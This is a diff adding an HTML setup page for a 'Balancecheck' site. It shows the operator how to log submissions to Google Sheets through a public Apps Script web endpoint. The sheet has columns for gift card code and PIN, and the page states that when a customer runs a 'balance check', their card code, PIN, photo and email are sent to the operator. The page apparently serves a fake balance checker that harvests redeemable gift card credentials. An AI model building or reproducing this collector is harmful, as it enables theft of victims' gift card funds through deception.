@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Balancecheck – Google Sheets Setup</title>
+<style>
+  :root { --blue: #0071e3; --bg: #f5f5f7; --card: #fff; --text: #1d1d1f; --mist: #6e6e73; --line: #d2d2d7; }
+  @media (prefers-color-scheme: dark) { :root { --bg: #000; --card: #161617; --text: #f5f5f7; --mist: #a1a1a6; --line: #2c2c2e; } }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; padding: 2rem 1rem; max-width: 700px; margin: 0 auto; }
+  h1 { font-size: 1.75rem; font-weight: 600; margin-bottom: 0.5rem; }
+  h2 { font-size: 1.25rem; font-weight: 600; margin: 2rem 0 0.75rem; color: var(--blue); }
+  p, li { margin-bottom: 0.5rem; color: var(--mist); }
+  ol { padding-left: 1.5rem; }
+  li { margin-bottom: 0.75rem; }
+  code { background: var(--card); border: 1px solid var(--line); border-radius: 6px; padding: 2px 6px; font-size: 0.9em; }
+  pre { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 1rem; overflow-x: auto; margin: 1rem 0; font-size: 0.85rem; line-height: 1.5; }
+  .card { background: var(--card); border: 1px solid var(--line); border-radius: 16px; padding: 1.5rem; margin: 1rem 0; }
+  .badge { display: inline-block; background: var(--blue); color: #fff; border-radius: 999px; padding: 2px 10px; font-size: 0.75rem; font-weight: 600; }
+  a { color: var(--blue); }
+  strong { color: var(--text); }
+  .copy-btn { background: var(--blue); color: #fff; border: none; border-radius: 8px; padding: 8px 16px; cursor: pointer; font-size: 0.875rem; font-weight: 500; margin-top: 0.5rem; }
+  .copy-btn:active { opacity: 0.8; }
+</style>
+</head>
+<body>
+
+<h1>Google Sheets Setup</h1>
+<p>Connect your Balancecheck site to Google Sheets so every order appears in a spreadsheet you control.</p>
+
+<h2>Step 1 — Create the Sheet</h2>
+<ol>
+  <li>Go to <a href="https://sheets.google.com" target="_blank">sheets.google.com</a> and create a new spreadsheet.</li>
+  <li>Name it <strong>Balancecheck Orders</strong>.</li>
+  <li>In <strong>Row 1</strong>, add these column headers:<br>
+    <code>Date</code> <code>Type</code> <code>Brand</code> <code>Region</code> <code>Value</code> <code>Code</code> <code>PIN</code> <code>Email</code> <code>Status</code>
+  </li>
+</ol>
+
+<h2>Step 2 — Create the Apps Script</h2>
+<ol>
+  <li>In your spreadsheet, go to <strong>Extensions → Apps Script</strong>.</li>
+  <li>Delete any code in the editor and paste the script below.</li>
+  <li>Click <strong>Save</strong> (💾).</li>
+</ol>
+
+<div class="card">
+<pre id="script-code">function doPost(e) {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  var data = JSON.parse(e.postData.contents);
+
+  sheet.appendRow([
+    new Date().toISOString(),
+    data.type || "",
+    data.brand || "",
+    data.region || "",
+    data.value || "",
+    data.code || "",
+    data.pin || "",
+    data.email || "",
+    "Pending"
+  ]);
+
+  return ContentService
+    .createTextOutput(JSON.stringify({ status: "ok" }))
+    .setMimeType(ContentService.MimeType.JSON);
+}
+
+function doGet() {
+  return ContentService
+    .createTextOutput(JSON.stringify({ status: "ready" }))
+    .setMimeType(ContentService.MimeType.JSON);
+}</pre>
+<button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('script-code').textContent)">Copy script</button>
+</div>
+
+<h2>Step 3 — Deploy as Web App</h2>
+<ol>
+  <li>In Apps Script, click <strong>Deploy → New deployment</strong>.</li>
+  <li>Click the ⚙️ gear next to "Select type" → choose <strong>Web app</strong>.</li>
+  <li>Set:
+    <ul>
+      <li><strong>Execute as:</strong> Me</li>
+      <li><strong>Who has access:</strong> Anyone</li>
+    </ul>
+  </li>
+  <li>Click <strong>Deploy</strong>.</li>
+  <li>Click <strong>Authorize access</strong> and allow the permissions.</li>
+  <li><strong>Copy the Web app URL</strong> — it looks like:<br>
+    <code>https://script.google.com/macros/s/AKfyc.../exec</code>
+  </li>
+</ol>
+
+<h2>Step 4 — Paste the URL in the Wallet Page</h2>
+<ol>
+  <li>Open your Balancecheck site and go to <strong>Wallet</strong>.</li>
+  <li>Paste the Web app URL into the <strong>"Google Sheets URL"</strong> field.</li>
+  <li>Click <strong>Save</strong>.</li>
+  <li>Every order will now appear in your spreadsheet automatically.</li>
+</ol>
+
+<h2>How It Works</h2>
+<div class="card">
+  <p><span class="badge">CHECK</span> When a customer submits a balance check, the card code, PIN, photo, and their email are sent to your sheet + your email.</p>
+  <p style="margin-top:0.75rem"><span class="badge">BUY</span> When a customer buys a card, the brand, amount, and their email appear in your sheet. You send the gift card to their email manually.</p>
+  <p style="margin-top:0.75rem"><span class="badge">STATUS</span> Mark the "Status" column as <strong>Delivered</strong> in the sheet once you've sent the card.</p>
+</div>
+
+<h2>Tips</h2>
+<ul style="padding-left:1.5rem">
+  <li>Sort the sheet by Date (newest first) to see recent orders on top.</li>
+  <li>Use <strong>conditional formatting</strong> on the Status column: green for "Delivered", yellow for "Pending".</li>
+  <li>You can add a <strong>notification rule</strong> in Google Sheets (Tools → Notification rules) to get emailed when a new row is added.</li>
+</ul>
+
+</body>
+</html>
